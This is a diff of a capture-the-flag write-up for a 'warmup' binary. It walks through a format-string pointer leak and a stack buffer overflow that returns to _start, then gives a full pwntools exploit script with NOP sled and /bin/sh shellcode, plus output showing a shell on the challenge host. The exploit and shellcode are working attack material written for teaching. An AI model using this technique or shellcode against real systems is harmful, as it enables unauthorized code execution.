@@ -36,7 +36,7 @@ We can verify that all protections are disabled using checksec...
 
 ```
 gef➤  checksec 
-[+] checksec for '/tpm/warmup'
+[+] checksec for '/tmp/warmup'
 Canary                        : No
 NX                            : No
 PIE                           : No
@@ -45,7 +45,7 @@ RelRO                         : Partial
 gef➤  
 ```
 
-That said, since PIE (ASLR) is only disabled for **this** binary, everything else will still be randomized, including the libc and the stack.  Luckily, we can abuse the format string vulnerability to leak pointers, and since we can overwrite main's return address, we can redirect it back to main's beginning afterward.  This gives us a second opportunity to exploit the overflow, after leaking a useful pointer.  Let's walk through it.
+That said, since PIE (ASLR) is only disabled for **this** binary, everything else will still be randomized, including the libc and the stack.  Luckily, we can abuse the format string vulnerability to leak pointers, and since we can overwrite main's return address, we can redirect it back to _start afterward.  This gives us a second opportunity to exploit the overflow, after leaking a useful pointer.  Let's walk through it.
 
 The return address will be overwritten at offset 264...
 
@@ -112,16 +112,16 @@ $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
 0x0000000000400709 in main ()
 ```
 
-main's address is 0x4006ba...
+_start's address is 0x400590...
 
 ```
-gef➤  p main
-$1 = {<text variable, no debug info>} 0x4006ba <main>
+gef➤  p -start
+$1 = {<text variable, no debug info>} 0x400590 <_start>
 ```
 
 Now lets look for a useful pointer.  Ideally, something on the stack near our buffer, that we can use to reliably calculate its address...
 
-Our stack is in the range: 0x00007ffff7ffe000 0x00007ffff7fff000
+Our stack is in the range: `0x00007ffff7ffe000 - 0x00007ffff7fff000`
 
 ```
 gef➤  vmmap 
@@ -215,9 +215,9 @@ It worked!  We can now calculate our buffer address at an offset of this pointer
 Therefore, our buffer will always be at `addr - 0x1e8`
 
 Putting it all together, we will
-1. Overflow the buffer with "%41$016lx ...264 total bytes + address_of_main"
+1. Overflow the buffer with `%41$016lx ...264 total bytes + address_of_main`
 2. Use the leaked pointer to calculate the buffer address
-3. Send another overflow, this time with "nops... + shellcode + address_of_buffer"
+3. Send another overflow, this time with `nops... + shellcode + address_of_buffer`
 4. Enjoy our shell!
 
 ```python
@@ -226,7 +226,7 @@ Putting it all together, we will
 from pwn import *
 import struct
 
-ADDR_MAIN = 0x400590
+ADDR_START = 0x400590
 
 # https://www.exploit-db.com/shellcodes/47008
 sc = "\x48\x83\xEC\x40" # sub rsp, 64
@@ -239,7 +239,7 @@ r = remote("127.0.0.1", 10001)
 
 r.recvuntil(":)\n")
 
-r.send("%41$016lx" + "A"*(264-9) + struct.pack("<Q", ADDR_MAIN) + "\n")
+r.send("%41$016lx" + "A"*(264-9) + struct.pack("<Q", ADDR_START) + "\n")
 
 data = r.recvuntil(":)\n")
 addr = int(data[0:16], 16) - 0x1e8
@@ -249,6 +249,17 @@ r.send("\x90"*(264 - len(sc)) + sc + struct.pack("<Q", addr) + "\n")
 
 r.interactive()
 ```
+
+```
+andrew@fujitsu /tmp % ./exploit.py 
+[+] Opening connection to nothing.chal.ctf.westerns.tokyo on port 10001: Done
+Buffer is at 00007ffda6c2f3b0
+[*] Switching to interactive mode
+\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90H\x83�@H1�VH�/bin//shWT_\xb0;\x99\x0f\x05\xb0�¦
+$ id
+uid=1000(warmup) gid=1000(warmup) groups=1000(warmup)
+$  
+
 
 ### Flag
 
